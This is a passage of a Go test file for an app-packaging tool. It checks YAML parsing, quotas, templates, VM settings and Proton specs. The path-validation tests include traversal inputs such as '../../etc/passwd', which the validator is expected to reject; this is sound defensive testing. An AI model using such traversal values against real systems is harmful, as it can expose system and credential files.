	t.Run("compile YAML with quota", func(t *testing.T) {
		input := `
image: nginx
environment: {}
network:
  external: {}
  internal: {}
volumes:
  data:
    mountpoint: /data
    quota: 2gb
questions: {}
`
		var pkg InputPackage
		err := yaml.NewDecoder(strings.NewReader(input)).Decode(&pkg)
		if err != nil {
			t.Fatalf("unexpected YAML decode error: %v", err)
		}
		compiled, err := pkg.Compile(Responses{})
		if err != nil {
			t.Fatalf("unexpected compile error: %v", err)
		}
		if compiled.Volumes["data"].Quota != 2147483648 {
			t.Fatalf("expected 2147483648, got %d", compiled.Volumes["data"].Quota)
		}
	})
}

func TestValidateTemplateName(t *testing.T) {
	valid := []string{"config", "my-config", "my_config", "Config1", "a123", "app.conf"}
	for _, name := range valid {
		t.Run("valid/"+name, func(t *testing.T) {
			if err := ValidateTemplateName(name); err != nil {
				t.Fatalf("expected %q to be valid: %v", name, err)
			}
		})
	}

	invalid := []string{"", "-start", ".hidden", "_start", "has space", "bad!"}
	for _, name := range invalid {
		label := name
		if label == "" {
			label = "empty"
		}
		t.Run("invalid/"+label, func(t *testing.T) {
			err := ValidateTemplateName(name)
			if err == nil {
				t.Fatalf("expected %q to be invalid", name)
			}
			if !errors.Is(err, ErrInvalidTemplateName) {
				t.Fatalf("expected ErrInvalidTemplateName, got %v", err)
			}
		})
	}
}

func TestValidateTemplateSpec(t *testing.T) {
	volumes := map[string]InputPackageVolume{
		"data": {Mountpoint: "/data"},
	}

	t.Run("valid spec", func(t *testing.T) {
		tmpl := InputPackageTemplate{Volume: "data", Path: "config.yaml", Content: "key: value"}
		if err := ValidateTemplateSpec(tmpl, volumes); err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
	})

	t.Run("empty volume rejected", func(t *testing.T) {
		tmpl := InputPackageTemplate{Volume: "", Path: "config.yaml", Content: "key: value"}
		err := ValidateTemplateSpec(tmpl, volumes)
		if err == nil {
			t.Fatal("expected error for empty volume")
		}
		if !errors.Is(err, ErrInvalidTemplateSpec) {
			t.Fatalf("expected ErrInvalidTemplateSpec, got %v", err)
		}
	})

	t.Run("empty path rejected", func(t *testing.T) {
		tmpl := InputPackageTemplate{Volume: "data", Path: "", Content: "key: value"}
		err := ValidateTemplateSpec(tmpl, volumes)
		if err == nil {
			t.Fatal("expected error for empty path")
		}
		if !errors.Is(err, ErrInvalidTemplateSpec) {
			t.Fatalf("expected ErrInvalidTemplateSpec, got %v", err)
		}
	})

	t.Run("empty content rejected", func(t *testing.T) {
		tmpl := InputPackageTemplate{Volume: "data", Path: "config.yaml", Content: ""}
		err := ValidateTemplateSpec(tmpl, volumes)
		if err == nil {
			t.Fatal("expected error for empty content")
		}
		if !errors.Is(err, ErrInvalidTemplateSpec) {
			t.Fatalf("expected ErrInvalidTemplateSpec, got %v", err)
		}
	})

	t.Run("nonexistent volume rejected", func(t *testing.T) {
		tmpl := InputPackageTemplate{Volume: "missing", Path: "config.yaml", Content: "key: value"}
		err := ValidateTemplateSpec(tmpl, volumes)
		if err == nil {
			t.Fatal("expected error for nonexistent volume")
		}
		if !errors.Is(err, ErrInvalidTemplateSpec) {
			t.Fatalf("expected ErrInvalidTemplateSpec, got %v", err)
		}
	})

	t.Run("templated volume skips lookup", func(t *testing.T) {
		tmpl := InputPackageTemplate{Volume: "@vol@", Path: "config.yaml", Content: "key: value"}
		if err := ValidateTemplateSpec(tmpl, volumes); err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
	})
}

func TestValidateTemplatePath(t *testing.T) {
	valid := []string{"config.yaml", "etc/app/config.yaml", "a.txt", "sub/dir/file.conf"}
	for _, path := range valid {
		t.Run("valid/"+path, func(t *testing.T) {
			if err := ValidateTemplatePath(path); err != nil {
				t.Fatalf("expected %q to be valid: %v", path, err)
			}
		})
	}

	t.Run("empty path rejected", func(t *testing.T) {
		err := ValidateTemplatePath("")
		if err == nil {
			t.Fatal("expected error for empty path")
		}
		if !errors.Is(err, ErrInvalidTemplatePath) {
			t.Fatalf("expected ErrInvalidTemplatePath, got %v", err)
		}
	})

	t.Run("absolute path rejected", func(t *testing.T) {
		err := ValidateTemplatePath("/etc/config.yaml")
		if err == nil {
			t.Fatal("expected error for absolute path")
		}
		if !errors.Is(err, ErrInvalidTemplatePath) {
			t.Fatalf("expected ErrInvalidTemplatePath, got %v", err)
		}
	})

	t.Run("path traversal rejected", func(t *testing.T) {
		err := ValidateTemplatePath("../../etc/passwd")
		if err == nil {
			t.Fatal("expected error for path traversal")
		}
		if !errors.Is(err, ErrInvalidTemplatePath) {
			t.Fatalf("expected ErrInvalidTemplatePath, got %v", err)
		}
	})

	t.Run("mid-path traversal rejected", func(t *testing.T) {
		err := ValidateTemplatePath("sub/../../../etc/passwd")
		if err == nil {
			t.Fatal("expected error for mid-path traversal")
		}
		if !errors.Is(err, ErrInvalidTemplatePath) {
			t.Fatalf("expected ErrInvalidTemplatePath, got %v", err)
		}
	})
}

func TestYAMLTemplateParsing(t *testing.T) {
	t.Run("parse templates from YAML", func(t *testing.T) {
		input := `
image: nginx
environment: {}
network:
  external: {}
  internal: {}
volumes:
  data:
    mountpoint: /data
questions: {}
templates:
  config:
    volume: data
    path: config.yaml
    content: |
      host: example.com
`
		var pkg InputPackage
		err := yaml.NewDecoder(strings.NewReader(input)).Decode(&pkg)
		if err != nil {
			t.Fatalf("unexpected YAML decode error: %v", err)
		}
		tmpl, ok := pkg.Templates["config"]
		if !ok {
			t.Fatal("expected config template in parsed output")
		}
		if tmpl.Volume != "data" {
			t.Fatalf("expected volume 'data', got %q", tmpl.Volume)
		}
		if tmpl.Path != "config.yaml" {
			t.Fatalf("expected path 'config.yaml', got %q", tmpl.Path)
		}
		if tmpl.Content != "host: example.com\n" {
			t.Fatalf("expected content 'host: example.com\\n', got %q", tmpl.Content)
		}
	})

	t.Run("compile YAML with templates", func(t *testing.T) {
		input := `
image: nginx
environment: {}
network:
  external: {}
  internal: {}
volumes:
  data:
    mountpoint: /data
questions: {}
templates:
  config:
    volume: data
    path: config.yaml
    content: "host: {{.Responses.hostname}}"
`
		var pkg InputPackage
		err := yaml.NewDecoder(strings.NewReader(input)).Decode(&pkg)
		if err != nil {
			t.Fatalf("unexpected YAML decode error: %v", err)
		}
		compiled, err := pkg.Compile(Responses{})
		if err != nil {
			t.Fatalf("unexpected compile error: %v", err)
		}
		if len(compiled.Templates) != 1 {
			t.Fatalf("expected 1 template, got %d", len(compiled.Templates))
		}
		if compiled.Templates["config"].Content != "host: {{.Responses.hostname}}" {
			t.Fatalf("expected content preserved, got %q", compiled.Templates["config"].Content)
		}
	})

	t.Run("no templates field produces nil map", func(t *testing.T) {
		input := `
image: nginx
environment: {}
network:
  external: {}
  internal: {}
volumes: {}
questions: {}
`
		var pkg InputPackage
		err := yaml.NewDecoder(strings.NewReader(input)).Decode(&pkg)
		if err != nil {
			t.Fatalf("unexpected YAML decode error: %v", err)
		}
		if len(pkg.Templates) != 0 {
			t.Fatalf("expected nil/empty templates, got %v", pkg.Templates)
		}
	})
}

func TestInputPackageImageYAMLUnmarshal(t *testing.T) {
	t.Run("string form", func(t *testing.T) {
		input := `
image: nginx:latest
environment: {}
network:
  external: {}
  internal: {}
volumes: {}
questions: {}
`
		var pkg InputPackage
		err := yaml.NewDecoder(strings.NewReader(input)).Decode(&pkg)
		if err != nil {
			t.Fatalf("unexpected YAML decode error: %v", err)
		}
		if pkg.Image.Type != ImageTypeOCI {
			t.Fatalf("expected type %q, got %q", ImageTypeOCI, pkg.Image.Type)
		}
		if pkg.Image.URL != "nginx:latest" {
			t.Fatalf("expected URL nginx:latest, got %q", pkg.Image.URL)
		}
	})

	t.Run("object form with url", func(t *testing.T) {
		input := `
image:
  type: oci
  url: ghcr.io/myorg/myapp:v1
environment: {}
network:
  external: {}
  internal: {}
volumes: {}
questions: {}
`
		var pkg InputPackage
		err := yaml.NewDecoder(strings.NewReader(input)).Decode(&pkg)
		if err != nil {
			t.Fatalf("unexpected YAML decode error: %v", err)
		}
		if pkg.Image.Type != "oci" {
			t.Fatalf("expected type oci, got %q", pkg.Image.Type)
		}
		if pkg.Image.URL != "ghcr.io/myorg/myapp:v1" {
			t.Fatalf("expected URL ghcr.io/myorg/myapp:v1, got %q", pkg.Image.URL)
		}
	})

	t.Run("object form without type defaults to oci", func(t *testing.T) {
		input := `
image:
  url: ghcr.io/myorg/myapp:v1
environment: {}
network:
  external: {}
  internal: {}
volumes: {}
questions: {}
`
		var pkg InputPackage
		err := yaml.NewDecoder(strings.NewReader(input)).Decode(&pkg)
		if err != nil {
			t.Fatalf("unexpected YAML decode error: %v", err)
		}
		if pkg.Image.Type != ImageTypeOCI {
			t.Fatalf("expected type %q, got %q", ImageTypeOCI, pkg.Image.Type)
		}
	})

	t.Run("object form without url for proton", func(t *testing.T) {
		input := `
image:
  type: oci
proton:
  app_image: mycompany/windows-app:1.0
  app_directory: /app
  volume: app
  exe: /app/myapp.exe
environment: {}
network:
  external: {}
  internal: {}
volumes:
  app:
    mountpoint: /app
questions: {}
`
		var pkg InputPackage
		err := yaml.NewDecoder(strings.NewReader(input)).Decode(&pkg)
		if err != nil {
			t.Fatalf("unexpected YAML decode error: %v", err)
		}
		if pkg.Image.URL != "" {
			t.Fatalf("expected empty URL, got %q", pkg.Image.URL)
		}
		if pkg.Proton == nil {
			t.Fatal("expected non-nil Proton")
		}
		if pkg.Proton.AppImage != "mycompany/windows-app:1.0" {
			t.Fatalf("expected app image, got %q", pkg.Proton.AppImage)
		}
	})
}

func TestValidateVMConfig(t *testing.T) {
	t.Run("valid local image", func(t *testing.T) {
		vm := &InputPackageVM{Image: "debian.raw", Memory: "2gb", CPUs: 2}
		if err := ValidateVMConfig(vm); err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
	})

	t.Run("valid URL image", func(t *testing.T) {
		vm := &InputPackageVM{Image: "https://example.com/debian-12.qcow2", Memory: "1gb", CPUs: 1}
		if err := ValidateVMConfig(vm); err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
	})

	t.Run("valid http URL image", func(t *testing.T) {
		vm := &InputPackageVM{Image: "http://mirror.local/vm.img", Memory: "1gb", CPUs: 1}
		if err := ValidateVMConfig(vm); err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
	})

	t.Run("valid template image", func(t *testing.T) {
		vm := &InputPackageVM{Image: "@vmimage@", Memory: "1gb", CPUs: 1}
		if err := ValidateVMConfig(vm); err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
	})

	t.Run("empty image rejected", func(t *testing.T) {
		vm := &InputPackageVM{Image: "", Memory: "1gb", CPUs: 1}
		err := ValidateVMConfig(vm)
		if err == nil {
			t.Fatal("expected error for empty image")
		}
		if !errors.Is(err, ErrInvalidVMConfig) {
			t.Fatalf("expected ErrInvalidVMConfig, got %v", err)
		}
	})

	t.Run("negative CPUs rejected", func(t *testing.T) {
		vm := &InputPackageVM{Image: "debian.raw", Memory: "1gb", CPUs: -1}
		err := ValidateVMConfig(vm)
		if err == nil {
			t.Fatal("expected error for negative CPUs")
		}
		if !errors.Is(err, ErrInvalidVMConfig) {
			t.Fatalf("expected ErrInvalidVMConfig, got %v", err)
		}
	})

	t.Run("zero CPUs accepted", func(t *testing.T) {
		vm := &InputPackageVM{Image: "debian.raw", Memory: "1gb", CPUs: 0}
		if err := ValidateVMConfig(vm); err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
	})

	t.Run("no memory accepted", func(t *testing.T) {
		vm := &InputPackageVM{Image: "debian.raw"}
		if err := ValidateVMConfig(vm); err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
	})
}

func TestValidateImageType(t *testing.T) {
	t.Run("empty defaults to oci", func(t *testing.T) {
		err := ValidateImageType("")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
	})
	t.Run("oci accepted", func(t *testing.T) {
		err := ValidateImageType("oci")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
	})
	t.Run("unknown rejected", func(t *testing.T) {
		err := ValidateImageType("docker")
		if err == nil {
			t.Fatal("expected error for unknown image type")
		}
		if !errors.Is(err, ErrInvalidImageType) {
			t.Fatalf("expected ErrInvalidImageType, got %v", err)
		}
	})
}

func TestValidateProtonSpec(t *testing.T) {
	volumes := map[string]InputPackageVolume{
		"app": {Mountpoint: "/app"},
	}

	t.Run("valid spec", func(t *testing.T) {
		spec := InputPackageProton{
			AppImage:     "mycompany/app:1.0",
			AppDirectory: "/app",
			Volume:       "app",
			Exe:          "/app/myapp.exe",
		}
		if err := ValidateProtonSpec(spec, volumes); err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
	})

	t.Run("missing app_image", func(t *testing.T) {
		spec := InputPackageProton{
			AppImage:     "",
			AppDirectory: "/app",
			Volume:       "app",
			Exe:          "/app/myapp.exe",
		}
		err := ValidateProtonSpec(spec, volumes)
		if err == nil {
			t.Fatal("expected error for missing app_image")
		}
		if !errors.Is(err, ErrInvalidProtonSpec) {
			t.Fatalf("expected ErrInvalidProtonSpec, got %v", err)
		}
	})

	t.Run("non-absolute app_directory", func(t *testing.T) {
		spec := InputPackageProton{
			AppImage:     "mycompany/app:1.0",
			AppDirectory: "relative/path",
			Volume:       "app",
			Exe:          "/app/myapp.exe",
		}
		err := ValidateProtonSpec(spec, volumes)
		if err == nil {
			t.Fatal("expected error for non-absolute app_directory")
		}
		if !errors.Is(err, ErrInvalidProtonSpec) {
			t.Fatalf("expected ErrInvalidProtonSpec, got %v", err)
		}
	})

	t.Run("unknown volume", func(t *testing.T) {
		spec := InputPackageProton{
			AppImage:     "mycompany/app:1.0",
			AppDirectory: "/app",
			Volume:       "nonexistent",
			Exe:          "/app/myapp.exe",
		}
		err := ValidateProtonSpec(spec, volumes)
		if err == nil {
			t.Fatal("expected error for unknown volume")
		}
		if !errors.Is(err, ErrInvalidProtonSpec) {
			t.Fatalf("expected ErrInvalidProtonSpec, got %v", err)
		}
	})

	t.Run("missing exe", func(t *testing.T) {
		spec := InputPackageProton{
			AppImage:     "mycompany/app:1.0",
			AppDirectory: "/app",
			Volume:       "app",
			Exe:          "",
		}
		err := ValidateProtonSpec(spec, volumes)
		if err == nil {
			t.Fatal("expected error for missing exe")
		}
		if !errors.Is(err, ErrInvalidProtonSpec) {
			t.Fatalf("expected ErrInvalidProtonSpec, got %v", err)
		}
	})
}
